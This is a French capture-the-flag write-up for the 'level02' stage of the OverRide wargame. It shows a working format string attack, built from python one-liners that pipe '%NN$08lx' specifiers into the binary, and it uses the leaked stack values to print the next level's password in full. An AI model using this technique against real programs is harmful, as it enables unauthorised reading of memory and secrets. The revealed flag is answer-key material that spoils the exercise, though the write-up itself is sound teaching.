## level02
- Le [code source désassemblé](/level02/source.c) permet de mieux comprendre le fonctionnement du binaire :
    - Le binaire va lire le contenu du fichier `/home/users/level03/.pass` et le stocker dans la variable `filePassword`. Puis il va demander un mot de passe à l'utilisateur et le stocker dans la variable `userPassword`. Enfin, il va comparer ces deux variables et lancer un shell si elles contiennent la même valeur.
    - On remarque que le dernier appel à `printf` est mal formaté : `printf(login);` au lieu de `printf("%s", login);`. La [page du manuel de `printf`](https://linux.die.net/man/3/printf) nous apprend que cette faille peut être exploitée :
    > Code such as printf(foo); often indicates a bug, since foo may contain a % character. If foo comes from untrusted user input, it may contain %n, causing the printf() call to write to memory and creating a security hole.
    - Plus précisément, on va chercher à obtenir le contenu de la chaîne `filePassword` en ayant recours à une [*format string attack*](https://en.wikipedia.org/wiki/Uncontrolled_format_string)
- `python -c 'print "%08lx|"*20' | ./level02` nous permet d'obtenir les 20 prochains paramètres sur la stack, mais rien n'y correspond au contenu d'un fichier `.pass`. Chaque bloc correspond à 8 caractères ; comme le `.pass` fait 40 caractères, on recherche un ensemble de cinq bloc contigus.
- Nous procédons itérativement pour trouver le contenu de `filePass` :
```
level02@OverRide:~$ python -c 'print "%20$08lx|" + "%21$08lx|" + "%22$08lx|" + "%23$08lx|" + "%24$08lx|" + "%25$08lx|" + "%26$08lx|" + "%27$08lx|" + "%28$08lx|" + "%29$08lx|"' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
100000000|00000000|756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d|00000000|786c383024303225|6c3830243132257c| does not have access!
```
- L'ensemble `756e505234376848|45414a3561733951|377a7143574e6758|354a35686e475873|48336750664b394d` semble prometteur. En convertissant chaque bloc de [texte hexadécimal en ASCII](https://codebeautify.org/hex-string-converter), puis en l'invertissant (les valeurs ont été affichées en *little-endian* alors qu'elles étaient écrites en *big-endian* dans le fichier), on arrive à la chaîne : `Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H` => Il s'agit bien du mot de passe de l'utilisateur `level03`.